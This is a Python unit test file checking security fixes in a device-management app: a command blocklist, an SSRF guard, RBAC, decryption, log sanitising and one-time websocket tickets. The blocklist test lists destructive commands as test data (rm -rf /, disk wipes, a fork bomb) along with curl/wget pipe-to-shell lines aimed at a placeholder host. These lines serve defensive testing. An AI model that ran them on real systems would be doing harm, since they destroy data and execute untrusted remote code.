"""Focused unit tests for the security-review fixes (no live server needed)."""

import json

import pytest


# ── validators: dangerous-command blocklist ──
def test_validate_script_command_blocks_dangerous():
    from app.validators import validate_script_command

    for cmd in [
        "rm -rf /",
        "rm -rf /home",
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/sda",
        ":(){ :|:& };:",
        "curl http://evil.sh | sh",
        "wget http://evil.sh | bash",
    ]:
        with pytest.raises(ValueError):
            validate_script_command(cmd)


def test_validate_script_command_allows_benign():
    from app.validators import validate_script_command

    validate_script_command("ls -la /var/log")
    validate_script_command("uptime")
    validate_script_command("df -h")


# ── crypto: InvalidToken no longer raises ──
def test_decrypt_invalid_returns_empty():
    from app.services import crypto

    enc = crypto.encrypt("hello")
    assert crypto.decrypt(enc) == "hello"
    assert crypto.decrypt("not-a-valid-fernet-token") == ""
    assert crypto.decrypt("") == ""


# ── utils: apply_update allowlist ──
def test_apply_update_allowlist():
    from app.utils import apply_update

    class Obj:
        def __init__(self):
            self.a = 1
            self.b = 2
            self.c = 3

    o = Obj()
    apply_update(o, {"a": 10, "b": 20, "c": 30, "d": 999}, ["a", "b"])
    assert o.a == 10 and o.b == 20
    assert o.c == 3  # untouched
    assert not hasattr(o, "d")  # unknown field ignored


def test_sanitize_for_log_strips_newline():
    from app.utils import sanitize_for_log

    out = sanitize_for_log("abc\n[FAKE] 200")
    assert "\n" not in out
    assert "[FAKE]" in out


# ── SSRF guard ──
def test_is_blocked_host():
    from app.validators import is_blocked_host

    assert is_blocked_host("169.254.169.254")  # cloud metadata
    assert is_blocked_host("127.0.0.1")
    assert is_blocked_host("169.254.1.1")
    assert not is_blocked_host("10.0.0.5")  # private networks allowed
    assert not is_blocked_host("192.168.1.1")
    assert not is_blocked_host("example.com")


# ── RBAC: is_admin flag + removed text-column bypass ──
def test_permissions_admin_flag_grants_all():
    from app.models.role import Role
    from app.models.user import User
    from app.services.permissions import is_admin_user, user_has_permission

    admin_role = Role(
        name="管理员",
        permissions=json.dumps(["device:view"]),
        device_scope="all",
        is_admin=True,
    )
    admin = User(username="admin", password="x", role="admin")
    admin.role_ref = admin_role
    # is_admin role grants every permission (even ones not in the list).
    assert user_has_permission(admin, "user:manage", db=None) is True
    assert user_has_permission(admin, "credential:manage", db=None) is True
    assert is_admin_user(admin) is True


def test_permissions_no_text_bypass():
    """role=='admin' text column with role_ref=None must NOT grant anything."""
    from app.models.user import User
    from app.services.permissions import user_has_permission

    u = User(username="x", password="x", role="admin")
    u.role_ref = None
    assert user_has_permission(u, "device:view", db=None) is False
    assert user_has_permission(u, "user:manage", db=None) is False


# ── inspection parser fixes ──
def test_parse_logins_excludes_footer_and_reboot():
    from app.services.inspection_parser import _parse_logins

    raw = (
        "root   pts/0 10.0.0.1  Thu Jun 10 09:00   still logged in\n"
        "reboot system boot 5.15.0      Thu Jun 10 09:00\n"
        "wwang  pts/1 10.0.0.2  Thu Jun 10 08:00 - 09:00\n"
        "wtmp begins Thu Jun 10 08:00:00\n"
    )
    r = _parse_logins(raw, "linux")
    # Two real login records (root, wwang); reboot + wtmp footer excluded.
    assert r["details"]["login_count"] == 2


def test_parse_cpu_windows_takes_last_number():
    from app.services.inspection_parser import _parse_cpu

    # Get-Counter output prefixes the value with a path containing digits.
    raw = "\\Processor(_Total)\\% Processor Time :\n12.3"
    r = _parse_cpu(raw, "windows")
    assert r["success"] is True
    assert r["value"] == "12.3"


def test_parse_processes_empty_is_error():
    from app.services.inspection_parser import _parse_processes

    # Output that doesn't match `ps aux` (busybox, etc.) → error, not "0 normal".
    r = _parse_processes("not a ps aux output at all", "linux")
    assert r["status"] == "error"


# ── WS ticket: single-use + expiry ──
def test_ws_ticket_single_use():
    from app.services.ws_ticket import consume_ticket, issue_ticket

    t = issue_ticket({"device_id": 1})
    assert consume_ticket(t) == {"device_id": 1}
    assert consume_ticket(t) is None  # consumed once
    assert consume_ticket(None) is None
    assert consume_ticket("bogous") is None
